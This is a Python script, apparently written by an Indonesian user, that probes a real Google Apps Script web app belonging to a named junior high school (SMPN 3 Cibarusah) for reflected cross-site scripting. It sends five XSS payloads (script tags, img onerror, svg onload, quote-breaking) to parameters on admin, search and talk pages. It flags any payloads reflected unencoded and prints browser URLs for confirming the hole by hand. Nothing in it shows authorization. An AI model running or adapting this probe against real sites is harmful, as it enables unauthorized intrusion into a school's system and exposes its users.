#!/usr/bin/env python3
"""
Quick XSS Tester untuk SMPN 3 Cibarusah
Manual testing dengan output jelas
"""

import requests
import urllib.parse

BASE_URL = "https://script.google.com/macros/s/AKfycby1kIXK0_Unpfbs4k8vc4np0zSC3xaMn806bwGAHbLlApobcmhB3NV07UbAWtv_Gd53Zw/exec"

print("""
╔═══════════════════════════════════════════════════╗
║   Quick XSS Tester - SMPN 3 Cibarusah            ║
╚═══════════════════════════════════════════════════╝
""")

# Test endpoints dan parameters
test_cases = [
    # Format: (page, param, payload, description)
    ('admin', 'username', '<script>alert(1)</script>', 'Basic script tag'),
    ('search', 'query', '<img src=x onerror=alert(1)>', 'Image onerror'),
    ('talk', 'message', '<svg onload=alert(1)>', 'SVG onload'),
    ('walas', 'name', '"><script>alert(1)</script>', 'Quote breaking'),
    ('data', 'id', "';alert(1);//", 'Single quote breaking'),
]

print("[*] Testing XSS vulnerabilities...\n")

for page, param, payload, desc in test_cases:
    print(f"[*] Testing: ?page={page}&{param}={desc}")
    
    try:
        # Construct URL
        test_url = f"{BASE_URL}?page={page}&{param}={urllib.parse.quote(payload)}"
        
        # Make request
        response = requests.get(test_url, timeout=10)
        
        # Check if payload is reflected WITHOUT encoding
        if payload in response.text:
            print(f"    [+] PAYLOAD REFLECTED (Potential XSS!)")
            print(f"    URL: {test_url[:80]}...")
            print(f"    Response length: {len(response.text)} bytes\n")
        elif payload.replace('<', '&lt;') not in response.text:
            print(f"    [?] Payload might be executed (not in source)")
            print(f"    URL: {test_url[:80]}...\n")
        else:
            print(f"    [x] Payload encoded (safe)\n")
            
    except Exception as e:
        print(f"    [!] Error: {e}\n")

print("\n" + "="*60)
print("MANUAL TESTING URLS:")
print("="*60)
print("\nTest these URLs manually in browser:")
print(f"\n1. Basic XSS:\n   {BASE_URL}?page=search&query=<script>alert('XSS')</script>")
print(f"\n2. Image onerror:\n   {BASE_URL}?page=search&query=<img src=x onerror=alert(1)>")
print(f"\n3. SVG onload:\n   {BASE_URL}?page=talk&message=<svg/onload=alert(1)>")
print(f"\n4. Event handler:\n   {BASE_URL}?page=walas&name=<body onload=alert(1)>")

print("\n" + "="*60)
print("If alert() pops up → XSS CONFIRMED!")
print("="*60)
